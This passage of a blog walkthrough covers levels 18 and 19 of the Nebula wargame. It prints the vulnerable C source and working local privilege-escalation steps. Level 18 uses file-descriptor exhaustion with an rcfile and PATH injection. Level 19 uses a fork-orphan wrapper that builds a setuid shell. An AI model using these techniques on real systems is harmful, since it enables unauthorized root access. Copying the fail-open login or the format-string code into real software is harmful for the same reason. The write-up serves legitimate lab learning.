  fp <span style=color:#f92672>=</span> fopen(PWFILE, <span style=color:#e6db74>&#34;r&#34;</span>);
  <span style=color:#66d9ef>if</span>(fp) {
      <span style=color:#66d9ef>char</span> file[<span style=color:#ae81ff>64</span>];

      <span style=color:#66d9ef>if</span>(fgets(file, <span style=color:#66d9ef>sizeof</span>(file) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>, fp) <span style=color:#f92672>==</span> NULL) {
          dprintf(<span style=color:#e6db74>&#34;Unable to read password file %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, PWFILE);
          <span style=color:#66d9ef>return</span>;
      }
                fclose(fp);
      <span style=color:#66d9ef>if</span>(strcmp(pw, file) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) <span style=color:#66d9ef>return</span>;
  }
  dprintf(<span style=color:#e6db74>&#34;logged in successfully (with%s password file)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,
      fp <span style=color:#f92672>==</span> NULL <span style=color:#f92672>?</span> <span style=color:#e6db74>&#34;out&#34;</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;&#34;</span>);

  globals.loggedin <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;

}

<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>notsupported</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>what)
{
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>buffer <span style=color:#f92672>=</span> NULL;
  asprintf(<span style=color:#f92672>&amp;</span>buffer, <span style=color:#e6db74>&#34;--&gt; [%s] is unsupported at this current time.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, what);
  dprintf(what);
  free(buffer);
}

<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setuser</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>user)
{
  <span style=color:#66d9ef>char</span> msg[<span style=color:#ae81ff>128</span>];

  sprintf(msg, <span style=color:#e6db74>&#34;unable to set user to &#39;%s&#39; -- not supported.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, user);
  printf(<span style=color:#e6db74>&#34;%s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, msg);

}

<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>envp)
{
  <span style=color:#66d9ef>char</span> c;

  <span style=color:#66d9ef>while</span>((c <span style=color:#f92672>=</span> getopt(argc, argv, <span style=color:#e6db74>&#34;d:v&#34;</span>)) <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
      <span style=color:#66d9ef>switch</span>(c) {
          <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;d&#39;</span><span style=color:#f92672>:</span>
              globals.debugfile <span style=color:#f92672>=</span> fopen(optarg, <span style=color:#e6db74>&#34;w+&#34;</span>);
              <span style=color:#66d9ef>if</span>(globals.debugfile <span style=color:#f92672>==</span> NULL) err(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;Unable to open %s&#34;</span>, optarg);
              setvbuf(globals.debugfile, NULL, _IONBF, <span style=color:#ae81ff>0</span>);
              <span style=color:#66d9ef>break</span>;
          <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;v&#39;</span><span style=color:#f92672>:</span>
              globals.verbose<span style=color:#f92672>++</span>;
              <span style=color:#66d9ef>break</span>;
      }
  }

  dprintf(<span style=color:#e6db74>&#34;Starting up. Verbose level = %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, globals.verbose);

  setresgid(getegid(), getegid(), getegid());
  setresuid(geteuid(), geteuid(), geteuid());

  <span style=color:#66d9ef>while</span>(<span style=color:#ae81ff>1</span>) {
      <span style=color:#66d9ef>char</span> line[<span style=color:#ae81ff>256</span>];
      <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>p, <span style=color:#f92672>*</span>q;

      q <span style=color:#f92672>=</span> fgets(line, <span style=color:#66d9ef>sizeof</span>(line)<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, stdin);
      <span style=color:#66d9ef>if</span>(q <span style=color:#f92672>==</span> NULL) <span style=color:#66d9ef>break</span>;
      p <span style=color:#f92672>=</span> strchr(line, <span style=color:#e6db74>&#39;\n&#39;</span>); <span style=color:#66d9ef>if</span>(p) <span style=color:#f92672>*</span>p <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
      p <span style=color:#f92672>=</span> strchr(line, <span style=color:#e6db74>&#39;\r&#39;</span>); <span style=color:#66d9ef>if</span>(p) <span style=color:#f92672>*</span>p <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;

      dvprintf(<span style=color:#ae81ff>2</span>, <span style=color:#e6db74>&#34;got [%s] as input</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, line);

      <span style=color:#66d9ef>if</span>(strncmp(line, <span style=color:#e6db74>&#34;login&#34;</span>, <span style=color:#ae81ff>5</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
          dvprintf(<span style=color:#ae81ff>3</span>, <span style=color:#e6db74>&#34;attempting to login</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
          login(line <span style=color:#f92672>+</span> <span style=color:#ae81ff>6</span>);
      } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(strncmp(line, <span style=color:#e6db74>&#34;logout&#34;</span>, <span style=color:#ae81ff>6</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
          globals.loggedin <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
      } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(strncmp(line, <span style=color:#e6db74>&#34;shell&#34;</span>, <span style=color:#ae81ff>5</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
          dvprintf(<span style=color:#ae81ff>3</span>, <span style=color:#e6db74>&#34;attempting to start shell</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
          <span style=color:#66d9ef>if</span>(globals.loggedin) {
              execve(<span style=color:#e6db74>&#34;/bin/sh&#34;</span>, argv, envp);
              err(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;unable to execve&#34;</span>);
          }
          dprintf(<span style=color:#e6db74>&#34;Permission denied</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
      } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(strncmp(line, <span style=color:#e6db74>&#34;logout&#34;</span>, <span style=color:#ae81ff>4</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
          globals.loggedin <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
      } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(strncmp(line, <span style=color:#e6db74>&#34;closelog&#34;</span>, <span style=color:#ae81ff>8</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
          <span style=color:#66d9ef>if</span>(globals.debugfile) fclose(globals.debugfile);
          globals.debugfile <span style=color:#f92672>=</span> NULL;
      } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(strncmp(line, <span style=color:#e6db74>&#34;site exec&#34;</span>, <span style=color:#ae81ff>9</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
          notsupported(line <span style=color:#f92672>+</span> <span style=color:#ae81ff>10</span>);
      } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(strncmp(line, <span style=color:#e6db74>&#34;setuser&#34;</span>, <span style=color:#ae81ff>7</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
          setuser(line <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span>);
      }
  }

  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
}
</code></pre></div><p>Ok. Not so small then. This program took a while to work through. Initially the vulnerability was not so obvious. I could figure out that a few flags were setting a few things inside the global struct and that a password file exists. If I was able to read the password, then I could be marked as logged in and eventually get to the line that does <code>execve("/bin/sh", argv, envp);</code>.</p>
<p>I noticed the buffer overflow and format string vulnerabilities, but considering the binary was compiled with SSP, partial RELO, and a NX stack, I figured that memory corruption was not necessarily the way to complete this one.</p>
<p>Lots of toying around with the program eventually got me to realize the flaw. If for some reason the program was not able to read the password file successfully, it would just log us in. The password file is <code>/home/flag18/password</code> and we don’t have the required permissions to move it or something. I suppose that would have been too easy anyways ;p</p>
<p>So what do we have left? I had to poke around and think about conditions that could make opening a file fail. Eventually I remembered about maximum file descriptors and figured it was worth a shot. What motivated this thinking was the fact that the binary has a <code>closelog</code> command too. So, I started to play around with <code>ulimit</code>, gradually reducing <code>-n</code> until I got to the value 4 as the one that would let me log in due to the fact that the password file could no longer being able to be read; This thanks to the maximum open files limit being reached.</p>
<p>Without setting the max open files, a sample run would be:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level18@nebula:~$ touch /tmp/log
level18@nebula:~$ tail -f /tmp/log &amp;
<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> <span style=color:#ae81ff>6499</span>

level18@nebula:~$ ~flag18/flag18 -vvv -d /tmp/log
Starting up. Verbose level <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>
login egg
got <span style=color:#f92672>[</span>login egg<span style=color:#f92672>]</span> as input
attempting to login
shell
got <span style=color:#f92672>[</span>shell<span style=color:#f92672>]</span> as input
attempting to start shell
Permission denied
</code></pre></div><p>Dropping the max open files to 4 though, we get:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level18@nebula:~$ ulimit -n <span style=color:#ae81ff>4</span>

level18@nebula:~$ ~flag18/flag18 -vvv -d /tmp/log
-sh: start_pipeline: pgrp pipe: Too many open files
tail: /tmp/log: file truncated
Starting up. Verbose level <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>
login egg
got <span style=color:#f92672>[</span>login egg<span style=color:#f92672>]</span> as input
attempting to login
logged in successfully <span style=color:#f92672>(</span>without password file<span style=color:#f92672>)</span>
shell
got <span style=color:#f92672>[</span>shell<span style=color:#f92672>]</span> as input
attempting to start shell
/home/flag18/flag18: error <span style=color:#66d9ef>while</span> loading shared libraries: libncurses.so.5: cannot open shared object file: Error <span style=color:#ae81ff>24</span>
</code></pre></div><p>Login worked :) We can also now call the shell command however the max open files thing looks like a problem. Luckily the binary had that <code>closelog</code> command that will free up a file descriptor. Rerunning the above but calling <code>closelog</code> before we call <code>shell</code> results in:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level18@nebula:~$ ~flag18/flag18 -vvv -d /tmp/log
-sh: start_pipeline: pgrp pipe: Too many open files
tail: /tmp/log: file truncated
Starting up. Verbose level <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>
login egg
got <span style=color:#f92672>[</span>login egg<span style=color:#f92672>]</span> as input
attempting to login
logged in successfully <span style=color:#f92672>(</span>without password file<span style=color:#f92672>)</span>
closelog
got <span style=color:#f92672>[</span>closelog<span style=color:#f92672>]</span> as input
shell
/home/flag18/flag18: -d: invalid option
Usage:  /home/flag18/flag18 <span style=color:#f92672>[</span>GNU long option<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>option<span style=color:#f92672>]</span> ...
    /home/flag18/flag18 <span style=color:#f92672>[</span>GNU long option<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>option<span style=color:#f92672>]</span> script-file ...
GNU long options:
    --debug
    --debugger
    --dump-po-strings
    --dump-strings
    --help
    --init-file
    --login
    --noediting
    --noprofile
    --norc
    --posix
    --protected
    --rcfile
    --restricted
    --verbose
    --version
Shell options:
    -irsD or -c command or -O shopt_option      <span style=color:#f92672>(</span>invocation only<span style=color:#f92672>)</span>
    -abefhkmnptuvxBCHP or -o option
</code></pre></div><p>Examining the error we get now together with the source code, it was clear that the arguments sent to the <code>flag18</code> binary was also passed to the <code>execve()</code> call. That means that the error is actually sourced from the fact that <code>sh</code> has no <code>-d</code> flag. In fact, one could replicate this error by simply calling <code>sh -d</code>. This called for some more man page reading once again. I realized later that the error may have also been a sort of hint based on the fact that the <em>GNU long options</em> are shown. <code>--rcfile</code> seemed like a good option as it would allow me to specify a type of init script to run. I had a number of attempts to try get this into something workable. Eventually the only file I could get it to load was the logfile I was specifying when running <code>flag18</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level18@nebula:~$ ~flag18/flag18 --rcfile -d /tmp/log -vvv
-sh: start_pipeline: pgrp pipe: Too many open files
/home/flag18/flag18: invalid option -- <span style=color:#e6db74>&#39;-&#39;</span>
/home/flag18/flag18: invalid option -- <span style=color:#e6db74>&#39;r&#39;</span>
/home/flag18/flag18: invalid option -- <span style=color:#e6db74>&#39;c&#39;</span>
/home/flag18/flag18: invalid option -- <span style=color:#e6db74>&#39;f&#39;</span>
/home/flag18/flag18: invalid option -- <span style=color:#e6db74>&#39;i&#39;</span>
/home/flag18/flag18: invalid option -- <span style=color:#e6db74>&#39;l&#39;</span>
/home/flag18/flag18: invalid option -- <span style=color:#e6db74>&#39;e&#39;</span>
tail: /tmp/log: file truncated
Starting up. Verbose level <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>
login egg
got <span style=color:#f92672>[</span>login egg<span style=color:#f92672>]</span> as input
attempting to login
logged in successfully <span style=color:#f92672>(</span>without password file<span style=color:#f92672>)</span>
closelog
got <span style=color:#f92672>[</span>closelog<span style=color:#f92672>]</span> as input
shell
/tmp/log: line 1: Starting: command not found
/tmp/log: line 2: got: command not found
/tmp/log: line 3: attempting: command not found
/tmp/log: line 4: syntax error near unexpected token <span style=color:#e6db74>`</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#39;
</span><span style=color:#e6db74>/tmp/log: line 4: `logged in successfully (without password file)&#39;</span>
</code></pre></div><p>The line <code>Starting: command not found</code> was as close as I could get to some form of controlled command execution. So, I created this file, exported it into my <code>PATH</code> and used it to prepare a small SETUID C shell.</p>
<p>So, to solve level18:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level18@nebula:~$ vim /var/tmp/Starting
level18@nebula:~$ chmod +x /var/tmp/Starting
level18@nebula:~$ cat /var/tmp/Starting
<span style=color:#75715e>#!/bin/sh</span>
/bin/sh

level18@nebula:~$ tail -f /tmp/log &amp;
<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> <span style=color:#ae81ff>7627</span>

level18@nebula:~$ Starting up. Verbose level <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>
got <span style=color:#f92672>[</span>login egg<span style=color:#f92672>]</span> as input
attempting to login
logged in successfully <span style=color:#f92672>(</span>without password file<span style=color:#f92672>)</span>
got <span style=color:#f92672>[</span>closelog<span style=color:#f92672>]</span> as input

level18@nebula:~$ export PATH<span style=color:#f92672>=</span>/var/tmp:$PATH
level18@nebula:~$ ulimit -n <span style=color:#ae81ff>4</span>

level18@nebula:~$ ~flag18/flag18 --rcfile -d /tmp/log -vvv
-sh: start_pipeline: pgrp pipe: Too many open files
/home/flag18/flag18: invalid option -- <span style=color:#e6db74>&#39;-&#39;</span>
/home/flag18/flag18: invalid option -- <span style=color:#e6db74>&#39;r&#39;</span>
/home/flag18/flag18: invalid option -- <span style=color:#e6db74>&#39;c&#39;</span>
/home/flag18/flag18: invalid option -- <span style=color:#e6db74>&#39;f&#39;</span>
/home/flag18/flag18: invalid option -- <span style=color:#e6db74>&#39;i&#39;</span>
/home/flag18/flag18: invalid option -- <span style=color:#e6db74>&#39;l&#39;</span>
/home/flag18/flag18: invalid option -- <span style=color:#e6db74>&#39;e&#39;</span>
tail: /tmp/log: file truncated
Starting up. Verbose level <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>
login egg
got <span style=color:#f92672>[</span>login egg<span style=color:#f92672>]</span> as input
attempting to login
logged in successfully <span style=color:#f92672>(</span>without password file<span style=color:#f92672>)</span>
closelog
got <span style=color:#f92672>[</span>closelog<span style=color:#f92672>]</span> as input
shell

sh-4.2$ getflag
sh: start_pipeline: pgrp pipe: Too many open files
You have successfully executed getflag on a target account
</code></pre></div><h2 id=level19>level19<a hidden class=anchor aria-hidden=true href=#level19>#</a></h2>
<p><a href=https://exploit-exercises.com/nebula/level19/>Level19&rsquo;s Description</a>:</p>
<blockquote>
<p>There is a flaw in the below program in how it operates.</p>
</blockquote>
<p>With the description we are provided with the source code of a small C program:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/stat.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>envp)
{
  pid_t pid;
  <span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>256</span>];
  <span style=color:#66d9ef>struct</span> stat statbuf;

  <span style=color:#75715e>/* Get the parent&#39;s /proc entry, so we can verify its user id */</span>

  snprintf(buf, <span style=color:#66d9ef>sizeof</span>(buf)<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;/proc/%d&#34;</span>, getppid());

  <span style=color:#75715e>/* stat() it */</span>

  <span style=color:#66d9ef>if</span>(stat(buf, <span style=color:#f92672>&amp;</span>statbuf) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
      printf(<span style=color:#e6db74>&#34;Unable to check parent process</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
      exit(EXIT_FAILURE);
  }

  <span style=color:#75715e>/* check the owner id */</span>

  <span style=color:#66d9ef>if</span>(statbuf.st_uid <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
      <span style=color:#75715e>/* If root started us, it is ok to start the shell */</span>

      execve(<span style=color:#e6db74>&#34;/bin/sh&#34;</span>, argv, envp);
      err(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;Unable to execve&#34;</span>);
  }

  printf(<span style=color:#e6db74>&#34;You are unauthorized to run this program</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
}
</code></pre></div><p>This one had me completely lost. After studying the functions used, I resorted to getting a hint. Partially reading another walkthrough, I came to the section where it mentions a <code>fork()</code> operation on the <code>flag19</code> binary. Basically, what it boils down to is the fact that when the process is forked and the parent dies, PID 1 (owned by root) will become the owner causing the checks we have in this binary to fail.</p>
<p>To go about this, we would have to write a small C wrapper that will fork itself. We need to give this wrapper a few seconds after the fork to finish off allowing the forked process to become orphaned. Once the process is in the orphaned state, we can <code>execv()</code> the <code>flag19</code> binary and prepare a shell :)</p>
<p>So, to solve level19:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>level19@nebula:/var/tmp$ vim pwn19.c
level19@nebula:/var/tmp$ cat pwn19.c
<span style=color:#75715e>#include&lt;stdio.h&gt;</span>
<span style=color:#75715e>#include&lt;unistd.h&gt;</span>

int main<span style=color:#f92672>(</span>void<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>

    pid_t pid <span style=color:#f92672>=</span> fork<span style=color:#f92672>()</span>;

    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>pid <span style=color:#f92672>==</span> 0<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>

        char *arg<span style=color:#f92672>[]</span> <span style=color:#f92672>=</span> <span style=color:#f92672>{</span> <span style=color:#e6db74>&#34;/bin/sh&#34;</span> , <span style=color:#e6db74>&#34;-c&#34;</span> , <span style=color:#e6db74>&#34;gcc /var/tmp/shell.c -o /var/tmp/flag19; chmod 4777 /var/tmp/flag19&#34;</span> , NULL<span style=color:#f92672>}</span>;
        sleep<span style=color:#f92672>(</span>2<span style=color:#f92672>)</span>; /* Give the fork <span style=color:#ae81ff>2</span> sec to orphan */
        execv<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/home/flag19/flag19&#34;</span>, arg<span style=color:#f92672>)</span>;
        printf<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Done fork\n&#34;</span><span style=color:#f92672>)</span>;
        <span style=color:#66d9ef>return</span> 0;
    <span style=color:#f92672>}</span>

    printf<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Done parent\n&#34;</span><span style=color:#f92672>)</span>;
    <span style=color:#66d9ef>return</span> 0;
<span style=color:#f92672>}</span>

level19@nebula:/var/tmp$ gcc pwn19.c -o pwn19
level19@nebula:/var/tmp$ ./pwn19
Done parent

level19@nebula:/var/tmp$ /var/tmp/flag19
sh-4.2$ getflag
You have successfully executed getflag on a target account
</code></pre></div><h2 id=conclusion>conclusion<a hidden class=anchor aria-hidden=true href=#conclusion>#</a></h2>
<p>Even though many of the levels were really really easy, the latter levels did force me to learn a few new things which was great. I think this is some really good learning material for people new to the scene. Heck, I think I will refer people to this next time they ask about OSCP&mldr; ;)</p>
<p>As a final touch, my &lsquo;loot&rsquo; in <code>/var/tmp</code> after finishing the last level:</p>
<figure>
<img loading=lazy src=/images/nebula_done.png>
</figure>
</div>
<footer class=post-footer>
<nav class=paginav>
<a class=prev href=https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter-toying-with-powersploit/>
<span class=title>« Prev Page</span>
<br>
<span>jenkins to meterpreter toying with powersploit</span>
</a>
<a class=next href=https://leonjza.github.io/blog/2015/02/21/beating-sokar-the-vulnhub-turns-0b10-challenge/>
<span class=title>Next Page »</span>
<br>
<span>beating sokar the vulnhub turns 0b10 challenge</span>
</a>
</nav>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share playing exploit-exercises - nebula on twitter" href="https://twitter.com/intent/tweet/?text=playing%20exploit-exercises%20-%20nebula&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f05%2f08%2fplaying-exploit-exercises-nebula%2f&hashtags="><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share playing exploit-exercises - nebula on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f05%2f08%2fplaying-exploit-exercises-nebula%2f&title=playing%20exploit-exercises%20-%20nebula&summary=playing%20exploit-exercises%20-%20nebula&source=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f05%2f08%2fplaying-exploit-exercises-nebula%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share playing exploit-exercises - nebula on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f05%2f08%2fplaying-exploit-exercises-nebula%2f&title=playing%20exploit-exercises%20-%20nebula"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share playing exploit-exercises - nebula on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f05%2f08%2fplaying-exploit-exercises-nebula%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
